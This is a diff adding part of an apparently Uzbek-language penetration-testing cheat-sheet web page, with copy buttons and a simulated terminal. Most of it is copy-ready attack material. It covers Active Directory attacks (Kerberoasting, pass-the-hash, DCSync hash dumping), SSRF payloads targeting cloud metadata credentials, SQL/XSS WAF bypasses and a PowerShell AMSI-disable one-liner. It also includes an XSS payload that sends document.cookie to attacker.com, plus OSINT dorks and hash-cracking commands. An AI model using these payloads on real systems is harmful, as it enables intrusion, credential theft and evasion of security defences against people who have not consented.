+      { name: 'ЁЯМР BloodHound CE (Online)', url: 'https://bloodhoundenterprise.io/' },
+      { name: 'ЁЯУЪ AD Security Blog', url: 'https://adsecurity.org/' },
+      { name: 'ЁЯУЪ HackTricks AD', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology' },
+      { name: 'ЁЯФз Impacket GitHub', url: 'https://github.com/fortra/impacket' },
+    ],
+    content: `
+<div class="info-box">ЁЯПЫя╕П <strong>Active Directory</strong> тАФ Windows domain hujumlari. BloodHound тЖТ Kerberoasting тЖТ DCSync ketma-ketligi eng samarali.</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯй╕ BloodHound</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">MA'LUMOT TO'PLASH</span><button class="copy-btn" onclick="copyCmd(this, '.\\SharpHound.exe -c All\nbloodhound-python -u user -p pass -d domain.local -ns DC_IP -c All')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">C:\\></span> .\\SharpHound.exe <span class="flag">-c All</span>
+<span class="prompt">$</span> bloodhound-python <span class="flag">-u</span> user <span class="flag">-p</span> pass <span class="flag">-d</span> domain.local <span class="flag">-ns</span> DC_IP <span class="flag">-c All</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯОл Kerberoasting</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">HASH OLISH</span><button class="copy-btn" onclick="copyCmd(this, 'GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request -outputfile kerb.hash\nhashcat -m 13100 kerb.hash rockyou.txt')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> GetUserSPNs.py domain.local/user:password <span class="flag">-dc-ip</span> DC_IP <span class="flag">-request</span>
+<span class="prompt">$</span> hashcat <span class="flag">-m 13100</span> kerb.hash rockyou.txt</div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФС Pass-the-Hash</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">PTH LATERAL MOVEMENT</span><button class="copy-btn" onclick="copyCmd(this, 'psexec.py domain/admin@TARGET -hashes :NTLM_HASH\ncrackmapexec smb TARGET -u admin -H NTLM_HASH -x \"whoami\"')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> psexec.py domain/admin@TARGET <span class="flag">-hashes</span> :NTLM_HASH
+<span class="prompt">$</span> crackmapexec smb TARGET <span class="flag">-u</span> admin <span class="flag">-H</span> NTLM_HASH <span class="flag">-x</span> <span class="string">"whoami"</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯТ░ DCSync</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">BARCHA HASHLAR</span><button class="copy-btn" onclick="copyCmd(this, 'secretsdump.py domain/admin:pass@DC_IP\nsecretsdump.py domain/admin@DC_IP -hashes :NTLM_HASH')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> secretsdump.py domain/admin:pass@DC_IP
+<span class="comment"># NTLM hashlar keladi тЖТ hashcat bilan sindiring</span></div>
+  </div>
+</div>`
+  },
+
+  ssrf: {
+    name: 'SSRF Attack',
+    title: 'root@kali:~# curl ssrf',
+    onlineLinks: [
+      { name: 'ЁЯМР PortSwigger SSRF Labs', url: 'https://portswigger.net/web-security/ssrf' },
+      { name: 'ЁЯМР SSRF Tester', url: 'https://ssrf.shorebreaksecurity.com/' },
+      { name: 'ЁЯУЪ PayloadsAllTheThings SSRF', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery' },
+      { name: 'ЁЯФз Ngrok (Callback)', url: 'https://ngrok.com/' },
+    ],
+    content: `
+<div class="info-box">ЁЯМР <strong>SSRF</strong> тАФ serverning o'zi ichki/tashqi resurslarga so'rov yuborishga majbur qilish. Cloud metadataga erishish <strong>Critical</strong>!</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">тШБя╕П Cloud Metadata (Eng Xavfli!)</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">AWS METADATA</span><button class="copy-btn" onclick="copyCmd(this, 'http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data/')">COPY</button></div>
+    <div class="cmd-code"><span class="string">http://169.254.169.254/latest/meta-data/</span>
+<span class="string">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+<span class="comment"># IAM credentials тЖТ AWS ga to'liq kirish!</span></div>
+  </div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">GCP / AZURE</span><button class="copy-btn" onclick="copyCmd(this, '# GCP:\nhttp://metadata.google.internal/computeMetadata/v1/ -H \"Metadata-Flavor: Google\"\n# Azure:\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01')">COPY</button></div>
+    <div class="cmd-code"><span class="comment"># GCP:</span>
+<span class="string">http://metadata.google.internal/computeMetadata/v1/</span>
+<span class="comment"># Azure:</span>
+<span class="string">http://169.254.169.254/metadata/instance?api-version=2021-02-01</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФТ Filter Bypass</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">127.0.0.1 BYPASS</span><button class="copy-btn" onclick="copyCmd(this, 'http://127.1\nhttp://0x7f000001\nhttp://2130706433\nhttp://[::1]\nhttp://127.0.0.1.nip.io\nhttp://target@127.0.0.1')">COPY</button></div>
+    <div class="cmd-code"><span class="string">http://127.1</span>
+<span class="string">http://0x7f000001</span>
+<span class="string">http://2130706433</span>
+<span class="string">http://[::1]</span>
+<span class="string">http://127.0.0.1.nip.io</span></div>
+  </div>
+</div>`
+  },
+
+  evasion: {
+    name: 'Evasion & WAF Bypass',
+    title: 'root@kali:~# bypass',
+    onlineLinks: [
+      { name: 'ЁЯМР WAF Bypass Tester', url: 'https://waf.ninja/' },
+      { name: 'ЁЯМР URL Encoder/Decoder', url: 'https://www.urlencoder.org/' },
+      { name: 'ЁЯМР Base64 Encode', url: 'https://www.base64encode.org/' },
+      { name: 'ЁЯУЪ PayloadsAllTheThings Bypass', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings' },
+    ],
+    content: `
+<div class="info-box">ЁЯЫбя╕П <strong>Evasion</strong> тАФ WAF, IDS/IPS, AMSI va antiviruslarni chetlab o'tish texnikalari.</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯТЙ SQL WAF Bypass</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">COMMENT BYPASS</span><button class="copy-btn" onclick="copyCmd(this, \"UNION/**/SELECT\\nUNI/**/ON SEL/**/ECT\\n/*!UNION*/ /*!SELECT*/\\nUNION%0aSELECT\\nUNION%09SELECT\")">COPY</button></div>
+    <div class="cmd-code"><span class="string">UNION/**/SELECT</span>
+<span class="string">UNI/**/ON SEL/**/ECT</span>
+<span class="string">/*!UNION*/ /*!SELECT*/</span>
+<span class="string">UNION%0aSELECT</span>
+<span class="string">UNION%09SELECT</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">тЪб XSS WAF Bypass</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">FILTER BYPASS PAYLOADS</span><button class="copy-btn" onclick="copyCmd(this, '<svg/onload=alert(1)>\n<details/open/ontoggle=alert(1)>\n<input onfocus=alert(1) autofocus>\n<script>eval(atob(\\'YWxlcnQoMSk=\\'))</script>\n<ScRiPt>alert(1)</ScRiPt>')">COPY</button></div>
+    <div class="cmd-code"><span class="string"><svg/onload=alert(1)></span>
+<span class="string"><details/open/ontoggle=alert(1)></span>
+<span class="string"><input onfocus=alert(1) autofocus></span>
+<span class="string"><script>eval(atob('YWxlcnQoMSk='))</script></span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯкЯ AMSI Bypass (Windows)</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">AMSI DISABLE</span><button class="copy-btn" onclick="copyCmd(this, '[Ref].Assembly.GetType(\\'System.Management.Automation.AmsiUtils\\').GetField(\\'amsiInitFailed\\',\\'NonPublic,Static\\').SetValue($null,$true)')">COPY</button></div>
+    <div class="cmd-code"><span class="string">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФН Nmap IDS Evasion</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">STEALTH SCAN</span><button class="copy-btn" onclick="copyCmd(this, 'nmap -T0 -f -D RND:15 --source-port 53 {TARGET}')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> nmap <span class="flag">-T0 -f -D RND:15 --source-port 53</span> <span class="string">{TARGET}</span></div>
+  </div>
+</div>`
+  },
+
+  xss: {
+    name: 'XSS Attack',
+    title: 'root@kali:~# xss',
+    onlineLinks: [
+      { name: 'ЁЯМР XSS Hunter (Blind XSS)', url: 'https://xsshunter.trufflesecurity.com/' },
+      { name: 'ЁЯМР PortSwigger XSS Labs', url: 'https://portswigger.net/web-security/cross-site-scripting' },
+      { name: 'ЁЯОп XSS Game (Mashq)', url: 'https://xss-game.appspot.com/' },
+      { name: 'ЁЯУЪ PayloadsAllTheThings XSS', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection' },
+    ],
+    content: `
+<div class="info-box">тЪб <strong>XSS</strong> тАФ Sahifaga JavaScript kod kiritish. Cookie o'g'irlash, session hijack, phishing uchun ishlatiladi.</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯзк Asosiy Test</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">BASIC PAYLOADS</span><button class="copy-btn" onclick="copyCmd(this, '<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\"><script>alert(1)</script>')">COPY</button></div>
+    <div class="cmd-code"><span class="string"><script>alert(1)</script></span>
+<span class="string"><img src=x onerror=alert(1)></span>
+<span class="string"><svg onload=alert(1)></span>
+<span class="string">"><script>alert(1)</script></span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯНк Cookie O'g'irlash</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">COOKIE STEAL</span><button class="copy-btn" onclick="copyCmd(this, \"<script>fetch('https://attacker.com/?c='+document.cookie)</script>\\n<script>new Image().src='https://attacker.com/?c='+btoa(document.cookie)</script>\")">COPY</button></div>
+    <div class="cmd-code"><span class="string"><script>fetch('https://attacker.com/?c='+document.cookie)</script></span>
+<span class="string"><img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)"></span></div>
+  </div>
+</div>`
+  },
+
+  osint: {
+    name: 'OSINT & Reconnaissance',
+    title: 'root@kali:~# osint',
+    onlineLinks: [
+      { name: 'ЁЯМР OSINT Framework', url: 'https://osintframework.com/' },
+      { name: 'ЁЯМР Shodan.io', url: 'https://www.shodan.io/' },
+      { name: 'ЁЯМР Maltego CE', url: 'https://www.maltego.com/ce-registration/' },
+      { name: 'ЁЯМР IntelTechniques Tools', url: 'https://inteltechniques.com/tools/' },
+      { name: 'ЁЯХ╡я╕П Epieos (Email OSINT)', url: 'https://epieos.com/' },
+      { name: 'ЁЯУ╕ PimEyes (Yuz)', url: 'https://pimeyes.com/' },
+    ],
+    content: `
+<div class="info-box">ЁЯХ╡я╕П <strong>OSINT</strong> тАФ ochiq manbalardan razvedka. Maqsad haqida eng ko'p ma'lumot shu bosqichda yig'iladi.</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФН Username Qidirish</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">SHERLOCK</span><button class="copy-btn" onclick="copyCmd(this, 'sherlock username\nmaigret username\npython3 whats-my-name.py -u username')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> sherlock <span class="string">username</span>
+<span class="prompt">$</span> maigret <span class="string">username</span>
+<span class="comment"># 300+ saytda avtomatik tekshiradi</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯМР Google Dorklar</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">MAXFIY MA'LUMOTLAR</span><button class="copy-btn" onclick="copyCmd(this, 'site:target.com filetype:env\nsite:target.com filetype:sql\nsite:target.com \"password\"\nsite:target.com inurl:admin\norg:companyname filename:.env site:github.com')">COPY</button></div>
+    <div class="cmd-code"><span class="string">site:target.com filetype:env</span>
+<span class="string">site:target.com filetype:sql</span>
+<span class="string">site:target.com "password"</span>
+<span class="string">org:companyname filename:.env site:github.com</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯУз Email OSINT</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">EMAIL TEKSHIRISH</span><button class="copy-btn" onclick="copyCmd(this, 'holehe email@example.com\n# Browser da:\n# https://epieos.com/\n# https://hunter.io/\n# https://haveibeenpwned.com/')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> holehe <span class="string">email@example.com</span>
+<span class="comment"># Qaysi saytlarda ro'yxatdan o'tganini topadi</span></div>
+  </div>
+</div>`
+  },
+
+  hash: {
+    name: 'Hash Cracking',
+    title: 'root@kali:~# hashcat',
+    onlineLinks: [
+      { name: 'ЁЯМР CrackStation (Online Hash)', url: 'https://crackstation.net/' },
+      { name: 'ЁЯМР Hashes.com', url: 'https://hashes.com/en/decrypt/hash' },
+      { name: 'ЁЯМР Hash Identifier', url: 'https://hashes.com/en/tools/hash_identifier' },
+      { name: 'ЁЯУе SecLists Wordlists', url: 'https://github.com/danielmiessler/SecLists/tree/master/Passwords' },
+    ],
+    content: `
+<div class="info-box">ЁЯФС <strong>Hash Cracking</strong> тАФ parol hashlarini ochish. GPU bilan hashcat tezroq, CPU uchun John the Ripper.</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯТ╗ Hashcat (GPU)</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">HASH TURLARI</span><button class="copy-btn" onclick="copyCmd(this, 'hashcat -m 0 hash.txt rockyou.txt       # MD5\nhashcat -m 100 hash.txt rockyou.txt     # SHA1\nhashcat -m 1000 ntlm.txt rockyou.txt   # NTLM\nhashcat -m 5600 net.txt rockyou.txt    # NetNTLMv2\nhashcat -m 13100 kerb.txt rockyou.txt  # Kerberos\nhashcat -m 22000 wifi.hc22000 rockyou.txt # WPA2')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> hashcat <span class="flag">-m 0</span> hash.txt rockyou.txt       <span class="comment"># MD5</span>
+<span class="prompt">$</span> hashcat <span class="flag">-m 1000</span> ntlm.txt rockyou.txt   <span class="comment"># NTLM</span>
+<span class="prompt">$</span> hashcat <span class="flag">-m 5600</span> net.txt rockyou.txt    <span class="comment"># NetNTLMv2</span>
+<span class="prompt">$</span> hashcat <span class="flag">-m 13100</span> kerb.txt rockyou.txt  <span class="comment"># Kerberos</span></div>
+  </div>
+</div>
+<div class="cmd-group">
+  <div class="cmd-group-title">ЁЯФи John the Ripper</div>
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="cmd-label">JOHN ASOSIY</span><button class="copy-btn" onclick="copyCmd(this, 'john hash.txt --wordlist=rockyou.txt\nssh2john id_rsa > ssh.hash && john ssh.hash\nzip2john file.zip > zip.hash && john zip.hash\njohn --show hash.txt')">COPY</button></div>
+    <div class="cmd-code"><span class="prompt">$</span> john hash.txt <span class="flag">--wordlist=</span>rockyou.txt
+<span class="prompt">$</span> ssh2john id_rsa > ssh.hash && john ssh.hash
+<span class="prompt">$</span> zip2john file.zip > zip.hash && john zip.hash</div>
+  </div>
+</div>`
+  },
+};
+
+// Simulated command responses
+const CMD_RESPONSES = {
+  'nmap': `Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for {target}
+Host is up (0.024s latency).
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1
+80/tcp   open  http     Apache httpd 2.4.41
+443/tcp  open  ssl/http Apache httpd 2.4.41
+3306/tcp open  mysql    MySQL 8.0.27
+
+Nmap done: 1 IP address (1 host up) scanned in 4.23 seconds`,
+  'sqlmap': `[*] starting @ 12:34:56 /2024-01-01/
+[*] testing connection to the target URL
+[*] checking if the target is protected by some kind of WAF/IPS
+[*] testing if the provided string is reachable
+[*] testing if target URL content is stable
+[+] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[+] target URL appears to have 3 columns in query
+[+] the back-end DBMS is MySQL`,
+  'whoami': `root`,
+  'id': `uid=0(root) gid=0(root) groups=0(root)`,
+  'ls': `total 48
+drwxr-xr-x  2 root root 4096 Jan  1 12:00 .
+drwxr-xr-x 20 root root 4096 Jan  1 12:00 ..
+-rw-r--r--  1 root root  220 Jan  1 12:00 .bash_logout
+-rw-r--r--  1 root root 3526 Jan  1 12:00 .bashrc
+-rwsr-xr-x  1 root root 8392 Jan  1 12:00 exploit
+-rw-r--r--  1 root root  807 Jan  1 12:00 .profile
+drwxr-xr-x  2 root root 4096 Jan  1 12:00 secret_docs`,
+  'pwd': `/root`,
+  'uname': `Linux kali 6.1.0-kali9-amd64 #1 SMP PREEMPT_DYNAMIC Kali GNU/Linux x86_64 GNU/Linux`,
+  'cat /etc/passwd': `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash`,
+  'sudo -l': `Matching Defaults entries for user on target:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User user may run the following commands on target:
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/find`,
+};
+
+function loadTool(toolId) {
+  const tool = TOOLS[toolId];
+  if (!tool) return;
+
+  document.querySelectorAll('.tool-btn').forEach(btn => btn.classList.remove('active'));
+  document.querySelectorAll('.tool-btn').forEach(btn => {
+    if (btn.getAttribute('onclick') === `loadTool('${toolId}')`) btn.classList.add('active');
+  });
+
+  document.getElementById('headerToolName').textContent = '// ' + tool.name;
+  document.getElementById('terminalTitle').textContent = tool.title;
+  document.getElementById('terminalContent').innerHTML = tool.content;
+
+  // Online links
+  const linksHtml = `<div class="online-title">// ONLINE TOOLLAR</div>` +
+    tool.onlineLinks.map(l => `<a href="${l.url}" target="_blank" class="online-link"><span class="link-icon">ЁЯФЧ</span>${l.name}</a>`).join('');
+  document.getElementById('onlineLinks').innerHTML = linksHtml;
+
+  // Hide output
+  document.getElementById('outputArea').classList.remove('show');
+  document.getElementById('cmdInput').value = '';
+}
+
+function copyCmd(btn, text) {
+  navigator.clipboard.writeText(text).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  });
+  btn.textContent = 'тЬЕ COPIED!';
+  btn.classList.add('copied');
+  setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 2000);
+}
+
+function runSimulated() {
+  const input = document.getElementById('cmdInput').value.trim();
+  if (!input) return;
+  const out = document.getElementById('outputArea');
+  out.classList.add('show');
+  let response = null;
+  for (const [key, val] of Object.entries(CMD_RESPONSES)) {
+    if (input.toLowerCase().includes(key)) { response = val; break; }
+  }
+  if (!response) {
+    response = `[SIMULATED] bash: Buyruq simulyatsiya rejimida. Real natija uchun Kali Linux terminalida ishlatinig.\n\nKirgan buyruq: ${input}`;
+  }
+  out.innerHTML = `<span style="color:var(--green)">root@kali:~# ${input}</span>\n\n${response}`;
+  document.getElementById('cmdInput').value = '';
+}
+
+document.getElementById('cmdInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter') runSimulated();
+});
+
+// Load from URL param
+const urlTool = new URLSearchParams(window.location.search).get('tool') || 'nmap';
+loadTool(urlTool);
+</script>
+</body>
+</html>
